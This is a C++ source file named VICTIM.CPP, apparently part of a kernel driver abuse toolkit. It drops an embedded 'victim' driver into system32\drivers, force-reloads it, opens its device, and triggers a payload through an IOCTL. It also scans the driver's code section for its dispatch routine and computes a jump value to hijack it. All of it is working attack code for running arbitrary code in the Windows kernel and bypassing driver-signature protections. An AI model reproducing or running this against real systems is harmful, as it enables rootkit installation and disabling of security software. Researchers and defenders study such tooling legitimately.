/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2023
*
*  TITLE:       VICTIM.CPP
*
*  VERSION:     1.30
*
*  DATE:        20 Mar 2023
*
*  Victim support routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* VpCreate
*
* Purpose:
*
* Load victim and obtain handle to it.
*
*/
BOOL VpCreate(
    _Inout_ PKDU_VICTIM_PROVIDER Context,
    _In_opt_ HINSTANCE ModuleBase,
    _Out_opt_ PHANDLE VictimHandle,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam
)
{
    supPrintfEvent(kduEventInformation,
        "[+] Processing victim \"%ws\" driver\r\n",
        Context->Desc);

    return Context->Callbacks.Create(
        ModuleBase,
        Context->Name,
        Context->ResourceId,
        Context->DesiredAccess,
        VictimHandle,
        &Context->Data.VictimImage,
        Callback,
        CallbackParam);
}

/*
* VpRelease
*
* Purpose:
*
* Unload victim and close it handle.
*
*/
BOOL VpRelease(
    _In_ PKDU_VICTIM_PROVIDER Context,
    _Inout_opt_ PHANDLE VictimHandle
)
{
    HANDLE victimHandle;

    if (VictimHandle) {
        victimHandle = *VictimHandle;
        if (victimHandle) {
            NtClose(victimHandle);
            *VictimHandle = NULL;
        }
    }

    if (Context->Data.VictimImage)
        VirtualFree(Context->Data.VictimImage, 0, MEM_RELEASE);

    return Context->Callbacks.Release(Context->Name);
}

/*
* VpExecutePayload
*
* Purpose:
*
* Execute payload inside victim.
*
*/
VOID VpExecutePayload(
    _In_ PKDU_VICTIM_PROVIDER Context,
    _Out_opt_ PHANDLE VictimHandle
)
{
    Context->Callbacks.Execute(Context->Name,
        Context->DesiredAccess,
        VictimHandle);
}

/*
* VppLoadUnloadDriver
*
* Purpose:
*
* Load/Unload driver using Native API.
* This routine will try to force unload driver on loading if Force parameter set to TRUE.
*
*/
NTSTATUS VppLoadUnloadDriver(
    _In_ LPCWSTR Name,
    _In_ LPCWSTR ImagePath,
    _In_ BOOLEAN Force,
    _In_ BOOLEAN Unload,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam
    )
{
    NTSTATUS ntStatus;

    if (Unload) {
        ntStatus = supUnloadDriver(Name, TRUE);
    }
    else {
        ntStatus = supLoadDriverEx(Name, ImagePath, Force, Callback, CallbackParam);
    }

    return ntStatus;
}

/*
* VppBuildDriverName
*
* Purpose:
*
* Create filepath for given victim name.
*
*/
LPWSTR VppBuildDriverName(
    _In_ LPCWSTR VictimName
)
{
    LPWSTR lpFileName;
    SIZE_T Length = (MAX_PATH + _strlen(VictimName)) * sizeof(WCHAR);

    lpFileName = (LPWSTR)supHeapAlloc(Length);
    if (lpFileName == NULL) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
    }
    else {

        StringCchPrintf(lpFileName,
            MAX_PATH * 2,
            L"%ws\\system32\\drivers\\%ws.sys",
            USER_SHARED_DATA->NtSystemRoot,
            VictimName);

    }

    return lpFileName;
}

/*
* VpCreateCallback
*
* Purpose:
*
* Drop, load and reference victim driver.
*
*/
BOOL VpCreateCallback(
    _In_ HINSTANCE ModuleBase,
    _In_ LPCWSTR Name, //same as device name
    _In_ ULONG ResourceId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE VictimHandle,
    _Out_opt_ PVOID* VictimImage,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam
)
{
    BOOL bResult = FALSE;
    NTSTATUS ntStatus;
    PBYTE  drvBuffer = NULL;
    ULONG  resourceSize = 0;
    LPWSTR driverFileName = NULL;
    HANDLE deviceHandle = NULL;

    if (VictimHandle)
        *VictimHandle = NULL;
    if (VictimImage)
        *VictimImage = NULL;

    driverFileName = VppBuildDriverName(Name);
    if (driverFileName) {

        do {

            if (supIsObjectExists((LPWSTR)L"\\Device", Name)) {

                supPrintfEvent(kduEventError,
                    "[!] Victim driver already loaded, force reload\r\n");

                supPrintfEvent(kduEventError,
                    "[!] Attempt to unload %ws\r\n", Name);

                ntStatus = VppLoadUnloadDriver(Name,
                    driverFileName,
                    FALSE,
                    TRUE,
                    NULL,
                    NULL);

                if (!NT_SUCCESS(ntStatus)) 
                {
                    supPrintfEvent(kduEventError,
                        "[!] Could not force unload victim, NTSTATUS(0x%lX) abort\r\n",
                        ntStatus);

                    break;
                }
                else {
                    supPrintfEvent(kduEventInformation,
                        "[+] Previous instance of victim driver unloaded\r\n");
                }
            }

            drvBuffer = (PBYTE)KDULoadResource(ResourceId,
                ModuleBase,
                &resourceSize,
                PROVIDER_RES_KEY,
                TRUE);

            if (drvBuffer == NULL) {
                SetLastError(ERROR_FILE_NOT_FOUND);
                break;
            }

            if (VictimImage) {

                DWORD vSize = 0;
                PVOID vpImage = PELoaderLoadImage(drvBuffer, &vSize);

                if (vpImage == NULL) {

                    supPrintfEvent(kduEventError,
                        "[!] Could not map victim image, abort\r\n");

                    SetLastError(ERROR_INTERNAL_ERROR);
                    break;
                }

                printf_s("[+] Mapped victim image at %p with size 0x%lX bytes\r\n", vpImage, vSize);

                *VictimImage = vpImage;
            }

            ULONG writeBytes;

            printf_s("[+] Extracting victim driver \"%ws\" as \"%ws\"\r\n", Name, driverFileName);

            writeBytes = (ULONG)supWriteBufferToFile(driverFileName,
                drvBuffer,
                resourceSize,
                TRUE,
                FALSE,
                &ntStatus);

            supHeapFree(drvBuffer);

            if (resourceSize != writeBytes) {

                //
                // Driver is in use.
                //
                if (ntStatus == STATUS_SHARING_VIOLATION) {
                    supPrintfEvent(kduEventError,
                        "[!] Sharing violation, driver maybe in use, please close all application(s) that are using this driver\r\n");
                }
                else {

                    supPrintfEvent(kduEventError,
                        "[!] Could not extract victim driver, NTSTATUS(0x%lX) abort\r\n",
                        ntStatus);

                }

                SetLastError(RtlNtStatusToDosError(ntStatus));
                break;
            }

            ntStatus = VppLoadUnloadDriver(Name,
                driverFileName,
                TRUE,
                FALSE,
                Callback,
                CallbackParam);

            if (NT_SUCCESS(ntStatus)) {

                SetLastError(ERROR_SUCCESS);

                if (VictimHandle) {

                    ntStatus = supOpenDriver(Name, DesiredAccess, &deviceHandle);
                    if (NT_SUCCESS(ntStatus)) {
                        *VictimHandle = deviceHandle;
                    }
                    else {
                        SetLastError(RtlNtStatusToDosError(ntStatus));
                    }
                }

                bResult = TRUE;

            }
            else {
                SetLastError(RtlNtStatusToDosError(ntStatus));
            }

        } while (FALSE);

        supHeapFree(driverFileName);
    }

    return bResult;
}

/*
* VpReleaseCallback
*
* Purpose:
*
* Unload victim driver.
*
*/
BOOL VpReleaseCallback(
    _In_ LPCWSTR Name
)
{
    BOOL bResult = FALSE;

    LPWSTR driverFileName = VppBuildDriverName(Name);
    if (driverFileName) {
        bResult = NT_SUCCESS(VppLoadUnloadDriver(Name, driverFileName, FALSE, TRUE, NULL, NULL));
        DeleteFile(driverFileName);
        supHeapFree(driverFileName);
    }

    return bResult;
}

/*
* VpExecuteCallback
*
* Purpose:
*
* Execute victim payload.
*
*/
VOID VpExecuteCallback(
    _In_ LPCWSTR Name,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE VictimHandle
)
{
    supOpenDriver(Name, DesiredAccess, VictimHandle);
}

/*
* VpExecuteCallbackEx
*
* Purpose:
*
* Execute victim payload by IOCTL call.
*
*/
VOID VpExecuteCallbackEx(
    _In_ LPCWSTR Name,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE VictimHandle
)
{
    HANDLE victimHandle = NULL;
    ULONG dummy = 0;

    if (NT_SUCCESS(supOpenDriver(Name, DesiredAccess, &victimHandle))) {

        supCallDriver(victimHandle, 0xBADDAB, &dummy, sizeof(dummy), &dummy, sizeof(dummy));

    }

    *VictimHandle = victimHandle;
}

/*
* VppOpenExistingDriverDevice
*
* Purpose:
*
* Open existing victim by it device name.
*
*/
BOOL VppOpenExistingDriverDevice(
    _In_ LPCWSTR Name,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE VictimHandle
)
{
    HANDLE deviceHandle = NULL;
    NTSTATUS ntStatus;
    LPWSTR lpDeviceName;
    SIZE_T sz;

    if (VictimHandle)
        *VictimHandle = NULL;

    sz = 64 + (1 + _strlen(Name)) * sizeof(WCHAR);
    lpDeviceName = (LPWSTR)supHeapAlloc(sz);
    if (lpDeviceName) {

        StringCchPrintf(lpDeviceName,
            sz / sizeof(WCHAR),
            L"\\Device\\%ws",
            Name);

        ntStatus = supOpenDriverEx(lpDeviceName, DesiredAccess, &deviceHandle);
        if (NT_SUCCESS(ntStatus)) {
            if (VictimHandle)
                *VictimHandle = deviceHandle;
        }
        else {
            SetLastError(RtlNtStatusToDosError(ntStatus));
        }

        supHeapFree(lpDeviceName);
    }

    return (deviceHandle != NULL);
}

/*
* VpExecuteFromExistingCallback
*
* Purpose:
*
* Execute victim payload in existing loaded driver.
*
*/
VOID VpExecuteFromExistingCallback(
    _In_ LPCWSTR Name,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE VictimHandle
)
{
    VppOpenExistingDriverDevice(Name, DesiredAccess, VictimHandle);
}

/*
* VpCreateFromExistingCallback
*
* Purpose:
*
* Create victim from existing loaded driver.
*
*/
BOOL VpCreateFromExistingCallback(
    _In_ HINSTANCE ModuleBase,
    _In_ LPCWSTR Name,
    _In_ ULONG ResourceId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE VictimHandle,
    _Out_opt_ PVOID* VictimImage,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam)
{
    UNREFERENCED_PARAMETER(ModuleBase);
    UNREFERENCED_PARAMETER(ResourceId);
    UNREFERENCED_PARAMETER(Callback);
    UNREFERENCED_PARAMETER(CallbackParam);

    if (VictimHandle) *VictimHandle = NULL;

    if (VictimImage) {

        *VictimImage = NULL;

        DWORD resourceSize = 0;
        PBYTE drvBuffer = (PBYTE)KDULoadResource(ResourceId,
            ModuleBase,
            &resourceSize,
            PROVIDER_RES_KEY,
            TRUE);

        if (drvBuffer == NULL) {
            SetLastError(ERROR_FILE_NOT_FOUND);
            return FALSE;
        }

        DWORD vSize = 0;
        PVOID vpImage = PELoaderLoadImage(drvBuffer, &vSize);

        if (vpImage == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Could not map victim image, abort\r\n");

            SetLastError(ERROR_INTERNAL_ERROR);
            return FALSE;
        }

        printf_s("[+] Mapped victim image at %p with size 0x%lX bytes\r\n", vpImage, vSize);

        *VictimImage = vpImage;

    }

    return VppOpenExistingDriverDevice(Name, DesiredAccess, VictimHandle);
}

/*
* VpReleaseCallbackStub
*
* Purpose:
*
* Stub routine.
*
*/
BOOL VpReleaseCallbackStub(
    _In_ LPCWSTR Name
)
{
    UNREFERENCED_PARAMETER(Name);

    return TRUE;
}

/*
* VpLoadDriverCallback
*
* Purpose:
*
* supLoadDriverEx callback to store specific data in registry entry.
*
*/
NTSTATUS CALLBACK VpLoadDriverCallback(
    _In_ PUNICODE_STRING RegistryPath,
    _In_opt_ PVOID Param
)
{
    NTSTATUS ntStatus = STATUS_SUCCESS;
    VICTIM_LOAD_PARAMETERS* params;

    UNREFERENCED_PARAMETER(RegistryPath);
   
    if (Param == NULL)
        return STATUS_INVALID_PARAMETER_2;
    
    params = (VICTIM_LOAD_PARAMETERS*)Param;

    switch (params->Provider->VictimId) {
    case KDU_VICTIM_PE1627:
    case KDU_VICTIM_PE1702:
    default:
        break;
    }

    return ntStatus;
}

/*
* VpQueryInformation
*
* Purpose:
*
* Query various victim information.
*
*/
_Success_(return != FALSE)
BOOL VpQueryInformation(
    _In_ PKDU_VICTIM_PROVIDER Context,
    _In_ VICTIM_INFORMATION VictimInformationClass,
    _Inout_ PVOID Information,
    _In_ ULONG InformationLength)
{
    BOOL bResult = TRUE;
    PVICTIM_IMAGE_INFORMATION imageInfo;
    PVICTIM_DRIVER_INFORMATION driverInfo;

    PVOID dispatchSignature = 0;
    ULONG signatureSize = 0;

    PVOID sectionBase;
    ULONG sectionSize;

    switch (VictimInformationClass) {

    case VictimImageInformation:

        if (InformationLength == sizeof(VICTIM_IMAGE_INFORMATION)) {

            imageInfo = (VICTIM_IMAGE_INFORMATION*)Information;

            dispatchSignature = Context->Data.DispatchSignature;
            signatureSize = Context->Data.DispatchSignatureLength;

            sectionBase = ntsupLookupImageSectionByName((CHAR*)TEXT_SECTION,
                TEXT_SECTION_LEGNTH,
                (PVOID)Context->Data.VictimImage,
                &sectionSize);

            if (sectionBase && sectionSize) {

                PBYTE ptrCode = NULL;

                ptrCode = (PBYTE)ntsupFindPattern((PBYTE)sectionBase,
                    sectionSize,
                    (PBYTE)dispatchSignature,
                    signatureSize);

                if (ptrCode) {
                    imageInfo->DispatchOffset = (ULONG_PTR)ptrCode & 0xffff;
                    imageInfo->DispatchPageOffset = imageInfo->DispatchOffset & 0xfff;

                    LONG_PTR rel = (LONG_PTR)sectionBase - (LONG_PTR)ptrCode - 5;

                    imageInfo->JumpValue = (ULONG)rel;
                }
                else {
                    SetLastError(ERROR_NOT_FOUND);
                    bResult = FALSE;
                }

            }
            else {
                SetLastError(ERROR_SECTION_NOT_FOUND);
                bResult = FALSE;
            }

        }
        else {
            SetLastError(ERROR_INVALID_PARAMETER);
            bResult = FALSE;
        }

        break;

    case VictimDriverInformation:

        if (InformationLength == sizeof(VICTIM_DRIVER_INFORMATION)) {

            driverInfo = (VICTIM_DRIVER_INFORMATION*)Information;

            PRTL_PROCESS_MODULE_INFORMATION target;
            PRTL_PROCESS_MODULES modulesList = (PRTL_PROCESS_MODULES)supGetLoadedModulesList(FALSE, NULL);
            if (modulesList) {

                ANSI_STRING driverNameAs;
                UNICODE_STRING driverNameUs;

                WCHAR szTargetDriver[MAX_PATH];

                StringCchPrintf(szTargetDriver, MAX_PATH, L"%ws.sys", Context->Name);
                RtlInitUnicodeString(&driverNameUs, szTargetDriver);

                driverNameAs.Buffer = NULL;
                driverNameAs.Length = driverNameAs.MaximumLength = 0;

                NTSTATUS ntStatus;

                ntStatus = RtlUnicodeStringToAnsiString(&driverNameAs, &driverNameUs, TRUE);
                if (NT_SUCCESS(ntStatus) && driverNameAs.Buffer) {

                    target = (PRTL_PROCESS_MODULE_INFORMATION)ntsupFindModuleEntryByName(modulesList, driverNameAs.Buffer);
                    if (target) {
                        driverInfo->LoadedImageBase = (ULONG_PTR)target->ImageBase;
                        driverInfo->ImageSize = target->ImageSize;
                    }

                    RtlFreeAnsiString(&driverNameAs);
                }
                else {
                    SetLastError(RtlNtStatusToDosError(ntStatus));
                    bResult = FALSE;
                }
                supHeapFree(modulesList);
            }
            else {
                SetLastError(ERROR_INTERNAL_ERROR);
                bResult = FALSE;
            }
        }
        else {
            SetLastError(ERROR_INVALID_PARAMETER);
            bResult = FALSE;
        }

        break;

    case VictimRopChainInformation:
        UNREFERENCED_PARAMETER(Information);
        bResult = FALSE;
        break;

    default:
        UNREFERENCED_PARAMETER(Information);
        bResult = FALSE;
        break;
    }

    return bResult;
}
